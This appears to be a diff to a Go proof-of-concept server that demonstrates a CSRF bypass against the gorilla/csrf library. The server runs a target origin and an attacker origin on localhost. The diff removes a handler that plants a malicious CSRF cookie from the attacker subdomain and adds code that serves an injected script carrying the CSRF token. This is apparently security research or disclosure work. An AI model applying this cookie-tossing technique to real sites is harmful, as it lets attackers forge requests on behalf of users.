@@ -8,28 +8,30 @@ import (
 	"io"
 	"log"
 	"net/http"
-	"os"
 
 	_ "embed"
 
 	"github.com/gorilla/csrf"
 )
 
-//go:embed attacker.html
-var attackerTemplateBytes []byte
-var attackerTemplate = template.Must(template.New("attacker").Parse(string(attackerTemplateBytes)))
+var (
+	//go:embed attacker.html
+	attackerTemplateBytes []byte
+	attackerTemplate      = template.Must(template.New("attacker").Parse(string(attackerTemplateBytes)))
 
-//go:embed target.html
-var targetTemplateBytes []byte
-var targetTemplate = template.Must(template.New("target").Parse(string(targetTemplateBytes)))
+	//go:embed target.html
+	targetTemplateBytes []byte
+	targetTemplate      = template.Must(template.New("target").Parse(string(targetTemplateBytes)))
 
-//go:embed inject.js
-var injectJSTemplateBytes []byte
-var injectJSTemplate = template.Must(template.New("inject.js").Parse(string(injectJSTemplateBytes)))
+	//go:embed inject.js
+	injectJSTemplateBytes []byte
+	injectJSTemplate      = template.Must(template.New("inject.js").Parse(string(injectJSTemplateBytes)))
 
-var domain = flag.String("domain", "foo.example.com", "domain to use for the demo (bind it and bad.$DOMAIN to localhost with /etc/hosts)")
-var tlsCertFile = flag.String("tls-cert", "", "path to TLS certificate file")
-var tlsKeyFile = flag.String("tls-key", "", "path to TLS key file")
+	// CLI flags
+	domain      = flag.String("domain", "example.test", "domain to use for the demo (bind it, target.$DOMAIN, and bad.$DOMAIN to localhost with /etc/hosts)")
+	tlsCertFile = flag.String("tls-cert", "", "path to TLS certificate file")
+	tlsKeyFile  = flag.String("tls-key", "", "path to TLS key file")
+)
 
 func main() {
 	flag.Parse()
@@ -37,32 +39,28 @@ func main() {
 		log.Fatal("both -tls-cert and -tls-key must be provided")
 	}
 
-	cer, err := tls.LoadX509KeyPair(*tlsCertFile, *tlsKeyFile)
+	crt, err := tls.LoadX509KeyPair(*tlsCertFile, *tlsKeyFile)
 	if err != nil {
-		log.Println(err)
-		return
+		log.Fatal(err)
 	}
 
-	config := &tls.Config{Certificates: []tls.Certificate{cer}}
+	config := &tls.Config{Certificates: []tls.Certificate{crt}}
 	ln, err := tls.Listen("tcp", ":443", config)
 	if err != nil {
 		log.Fatal(err)
 	}
 	log.Printf("listening on %s", ln.Addr())
-	log.Printf("PID is %d", os.Getpid())
 
 	primaryOrigin := csrf.Protect([]byte("32-byte-long-auth-key"), csrf.Secure(true))(http.HandlerFunc(primaryOriginHandler))
 
 	attackerOriginMux := http.NewServeMux()
-	attackerOriginMux.HandleFunc("/set-cookie", attackerOriginSetCookieHandler)
 	attackerOriginMux.HandleFunc("/", attackerOriginHandler)
 
 	if err := http.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		log.Printf("%s %s %s", r.Host, r.Method, r.URL)
-		if r.Host == *domain {
-			primaryOrigin.ServeHTTP(w, r)
-		} else {
+		if r.Host == "bad."+*domain {
 			attackerOriginMux.ServeHTTP(w, r)
+		} else {
+			primaryOrigin.ServeHTTP(w, r)
 		}
 	})); err != nil && err != http.ErrServerClosed {
 		log.Fatal(err)
@@ -70,7 +68,6 @@ func main() {
 }
 
 func serveTargetHome(w http.ResponseWriter, r *http.Request) {
-
 	data := map[string]any{
 		csrf.TemplateTag: csrf.TemplateField(r),
 		"CSRFToken":      csrf.Token(r),
@@ -88,22 +85,31 @@ func serveTargetHome(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+func serveInjectJS(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/javascript")
+	b := bytes.NewBuffer(nil)
+
+	if err := injectJSTemplate.Execute(b, map[string]any{
+		"Domain": *domain,
+		"Token":  csrf.Token(r),
+	}); err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+	}
+	if _, err := io.Copy(w, b); err != nil {
+		log.Printf("error writing response: %v", err)
+	}
+}
+
 func primaryOriginHandler(w http.ResponseWriter, r *http.Request) {
 	switch r.Method {
 	case "GET":
 		switch r.URL.Path {
 		case "/":
 			serveTargetHome(w, r)
-			return
 		case "/inject.js":
-			w.Header().Set("Content-Type", "application/javascript")
-			if err := injectJSTemplate.Execute(w, map[string]any{"Domain": *domain}); err != nil {
-				http.Error(w, err.Error(), http.StatusInternalServerError)
-			}
-			return
+			serveInjectJS(w, r)
 		default:
 			http.Error(w, "not found", http.StatusNotFound)
-			return
 		}
 	case "POST":
 		if r.URL.Path == "/submit" {
@@ -112,34 +118,6 @@ func primaryOriginHandler(w http.ResponseWriter, r *http.Request) {
 		}
 		http.Error(w, "invalid POST request", http.StatusBadRequest)
 	}
-}
-
-func attackerOriginSetCookieHandler(w http.ResponseWriter, r *http.Request) {
-	if r.Method != "POST" {
-		http.Error(w, "invalid method", http.StatusBadRequest)
-		return
-	}
-
-	// create the malicious CSRF cookie
-	c := http.Cookie{
-		Name:   "_gorilla_csrf",
-		Domain: "example.com",
-		Path:   "/submit",
-	}
-
-	if err := r.ParseForm(); err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		return
-	}
-	token := r.Form.Get("token")
-	if token == "" {
-		http.Error(w, "missing token", http.StatusBadRequest)
-		return
-	}
-	c.Value = token
-
-	http.SetCookie(w, &c)
-	io.WriteString(w, "Wrote cookie with token: "+c.Value)
 }
 
 func attackerOriginHandler(w http.ResponseWriter, r *http.Request) {
